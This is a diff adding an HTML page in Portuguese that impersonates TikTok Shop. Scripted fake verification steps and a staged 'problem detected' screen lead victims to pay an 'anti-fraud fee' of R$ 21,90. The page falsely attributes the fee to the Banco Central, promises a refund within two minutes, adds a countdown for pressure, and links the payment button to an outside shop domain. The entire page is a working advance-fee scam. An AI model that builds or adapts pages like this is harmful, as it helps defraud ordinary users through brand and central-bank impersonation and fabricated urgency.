@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-4JP5N9ED3X"></script> 
+  <script> 
+    window.dataLayer = window.dataLayer || []; 
+    function gtag(){ dataLayer.push(arguments); } 
+    gtag('js', new Date()); 
+    gtag('config', 'G-4JP5N9ED3X'); 
+  </script>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>UP 3 - TikTok</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: #ffffff;
+      color: #000000;
+      min-height: 100vh;
+      line-height: 1.4;
+      overflow-x: hidden;
+    }
+
+    .tiktok-header {
+      width: 100%;
+      background: #ffffff;
+      padding: 16px 0;
+      border-bottom: 1px solid #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .tiktok-logo {
+      height: 24px;
+    }
+
+    .container {
+      max-width: 375px;
+      margin: 0 auto;
+      padding: 0;
+    }
+
+    /* Tela de Verificação */
+    .verification-screen {
+      padding: 60px 24px;
+      text-align: center;
+      background: #ffffff;
+      min-height: 70vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .verification-icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #00c853, #00e676);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+      color: white;
+      font-size: 32px;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    .loading-dots {
+      display: flex;
+      justify-content: center;
+      gap: 6px;
+      margin: 20px 0;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #ff0050;
+      animation: dotPulse 1.4s infinite ease-in-out;
+    }
+
+    .dot:nth-child(1) { animation-delay: -0.32s; }
+    .dot:nth-child(2) { animation-delay: -0.16s; }
+
+    @keyframes dotPulse {
+      0%, 80%, 100% { transform: scale(0); opacity: 0.5; }
+      40% { transform: scale(1); opacity: 1; }
+    }
+
+    .verification-text {
+      font-size: 16px;
+      color: #666666;
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+
+    .verification-step {
+      font-size: 14px;
+      color: #888888;
+      margin-bottom: 4px;
+      opacity: 0;
+      animation: fadeIn 0.5s ease forwards;
+    }
+
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
+
+    /* Tela de Problema Detectado */
+    .problem-screen {
+      padding: 60px 24px;
+      text-align: center;
+      background: #ffffff;
+      min-height: 70vh;
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .problem-icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #ff0050, #ff2a6d);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+      color: white;
+      font-size: 32px;
+      animation: shake 0.5s ease-in-out;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+
+    .problem-text {
+      font-size: 16px;
+      color: #ff0050;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+
+    .problem-description {
+      font-size: 14px;
+      color: #666666;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+
+    /* Tela Principal (aparece depois do problema) */
+    .main-content {
+      display: none;
+    }
+
+    .status-section {
+      padding: 32px 24px 24px;
+      text-align: center;
+      background: #ffffff;
+    }
+
+    .status-icon {
+      width: 64px;
+      height: 64px;
+      background: linear-gradient(135deg, #ff0050, #ff2a6d);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      color: white;
+      font-size: 24px;
+    }
+
+    h1 {
+      color: #000000;
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 12px;
+      letter-spacing: -0.3px;
+    }
+
+    .status-description {
+      font-size: 15px;
+      color: #666666;
+      line-height: 1.5;
+    }
+
+    .security-alert {
+      background: #fff9fa;
+      border-top: 1px solid #ffebee;
+      border-bottom: 1px solid #ffebee;
+      padding: 20px 24px;
+      margin: 0;
+    }
+
+    .alert-title {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #ff0050;
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+
+    .alert-description {
+      font-size: 14px;
+      color: #666666;
+      line-height: 1.5;
+    }
+
+    .alert-description strong {
+      color: #000000;
+      font-weight: 600;
+    }
+
+    .validation-section {
+      padding: 24px;
+      background: #ffffff;
+    }
+
+    .fee-card {
+      background: #f8f9fa;
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+      border: 1px solid #e8e8e8;
+    }
+
+    .fee-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #ff0050;
+      color: white;
+      padding: 8px 12px;
+      border-radius: 16px;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 16px;
+    }
+
+    .fee-amount {
+      font-size: 28px;
+      font-weight: 800;
+      color: #ff0050;
+      margin-bottom: 8px;
+    }
+
+    .fee-note {
+      font-size: 14px;
+      color: #666666;
+      margin-bottom: 20px;
+    }
+
+    .benefits {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin: 20px 0;
+    }
+
+    .benefit {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 0;
+    }
+
+    .benefit-icon {
+      width: 20px;
+      height: 20px;
+      background: #00c853;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 10px;
+      flex-shrink: 0;
+    }
+
+    .benefit-text {
+      font-size: 14px;
+      color: #333333;
+      text-align: left;
+    }
+
+    .tiktok-button {
+      width: 100%;
+      border: 0;
+      border-radius: 12px;
+      padding: 16px 20px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      color: white;
+      background: linear-gradient(135deg, #00c853, #00e676);
+      transition: all 0.2s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      text-decoration: none;
+      margin: 20px 0 16px 0;
+    }
+
+    .tiktok-button:active {
+      transform: scale(0.98);
+    }
+
+    .timer-section {
+      padding: 16px 24px 24px;
+      background: #ffffff;
+      border-top: 1px solid #f0f0f0;
+    }
+
+    .timer {
+      text-align: center;
+      font-size: 13px;
+      color: #666666;
+      font-weight: 500;
+    }
+
+    .timer span {
+      color: #ff0050;
+      font-weight: 700;
+    }
+
+    .footer-note {
+      text-align: center;
+      font-size: 12px;
+      color: #888888;
+      line-height: 1.4;
+      padding: 0 24px 24px;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="tiktok-header">
+    <img src="/unnamed copy copy.png" alt="TikTok Shop" class="tiktok-logo">
+  </div>
+
+  <div class="container">
+    <!-- Tela de Verificação (inicial) -->
+    <div class="verification-screen" id="verificationScreen">
+      <div class="verification-icon">
+        <i class="fas fa-search"></i>
+      </div>
+      
+      <div class="verification-text">Verificando segurança da transação</div>
+      
+      <div class="loading-dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+
+      <div class="verification-step" id="step1" style="animation-delay: 1.5s;">✓ Verificando dados da conta</div>
+      <div class="verification-step" id="step2" style="animation-delay: 3s;">✓ Validando informações pessoais</div>
+      <div class="verification-step" id="step3" style="animation-delay: 4.5s;">✓ Conectando com sistema bancário</div>
+      <div class="verification-step" id="step4" style="animation-delay: 6s;">✓ Consultando Banco Central</div>
+    </div>
+
+    <!-- Tela de Problema Detectado -->
+    <div class="problem-screen" id="problemScreen">
+      <div class="problem-icon">
+        <i class="fas fa-exclamation-triangle"></i>
+      </div>
+      
+      <div class="problem-text">Problema Detectado</div>
+      <div class="problem-description">
+        Foi identificada uma atividade suspeita em sua transação. 
+        É necessária uma validação adicional de segurança para continuar.
+      </div>
+    </div>
+
+    <!-- Tela Principal (aparece depois do problema) -->
+    <div class="main-content" id="mainContent">
+      <!-- Status -->
+      <div class="status-section">
+        <div class="status-icon">
+          <i class="fas fa-lock"></i>
+        </div>
+        <h1>Validação de Segurança</h1>
+        <div class="status-description">
+          Seu saque precisa de verificação adicional
+        </div>
+      </div>
+
+      <!-- Alerta de Segurança -->
+      <div class="security-alert">
+        <div class="alert-title">
+          <i class="fas fa-exclamation-triangle"></i>
+          Medida de Segurança
+        </div>
+        <div class="alert-description">
+          Devido ao aumento de tentativas de fraude, o <strong>Banco Central</strong> exige uma validação de segurança. Esta taxa de <strong>R$ 21,90</strong> será reembolsada em 2 minutos após o pagamento.
+        </div>
+      </div>
+
+      <!-- Validação -->
+      <div class="validation-section">
+        <div class="fee-card">
+          <div class="fee-badge">
+            <i class="fas fa-shield-alt"></i>
+            TAXA ANTI-FRAUDE
+          </div>
+          
+          <div class="fee-amount">R$ 21,90</div>
+          <div class="fee-note">Valor reembolsável em 2 minutos</div>
+
+          <div class="benefits">
+            <div class="benefit">
+              <div class="benefit-icon">
+                <i class="fas fa-check"></i>
+              </div>
+              <div class="benefit-text">Liberação imediata do saque</div>
+            </div>
+            <div class="benefit">
+              <div class="benefit-icon">
+                <i class="fas fa-check"></i>
+              </div>
+              <div class="benefit-text">Proteção garantida pelo BC</div>
+            </div>
+            <div class="benefit">
+              <div class="benefit-icon">
+                <i class="fas fa-check"></i>
+              </div>
+              <div class="benefit-text">Reembolso automático</div>
+            </div>
+          </div>
+
+          <a class="tiktok-button" href="https://blackdotik11.shop/tik/uppp2/pay/">
+            <i class="fas fa-credit-card"></i>
+            PAGAR E LIBERAR SAQUE
+          </a>
+        </div>
+      </div>
+
+      <!-- Timer -->
+      <div class="timer-section">
+        <div class="timer">
+          <i class="fas fa-clock"></i> Validação disponível por: <span id="timer">04:00</span>
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <div class="footer-note">
+        Esta validação é necessária para conclusão segura da transferência conforme exigido pelo Banco Central.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Simula o processo de verificação mais longo
+    setTimeout(() => {
+      document.getElementById('step1').style.opacity = '1';
+    }, 1500);
+
+    setTimeout(() => {
+      document.getElementById('step2').style.opacity = '1';
+    }, 3000);
+
+    setTimeout(() => {
+      document.getElementById('step3').style.opacity = '1';
+    }, 4500);
+
+    setTimeout(() => {
+      document.getElementById('step4').style.opacity = '1';
+    }, 6000);
+
+    // Após 7.5 segundos, mostra a tela de problema
+    setTimeout(() => {
+      document.getElementById('verificationScreen').style.display = 'none';
+      document.getElementById('problemScreen').style.display = 'flex';
+    }, 7500);
+
+    // Após 2 segundos na tela de problema, vai automaticamente para a tela principal
+    setTimeout(() => {
+      document.getElementById('problemScreen').style.display = 'none';
+      document.getElementById('mainContent').style.display = 'block';
+      
+      // Inicia o timer da oferta
+      let duration = 4 * 60; // 4 minutos
+      let display = document.getElementById('timer');
+      const timer = setInterval(() => {
+        let minutes = Math.floor(duration / 60);
+        let seconds = duration % 60;
+        minutes = minutes < 10 ? '0' + minutes : minutes;
+        seconds = seconds < 10 ? '0' + seconds : seconds;
+        display.textContent = minutes + ":" + seconds;
+        if (--duration < 0) {
+          clearInterval(timer);
+          display.textContent = "expirado";
+        }
+      }, 1000);
+    }, 9500); // 7.5s + 2s = 9.5 segundos totais
+  </script>
+
+</body>
+</html>
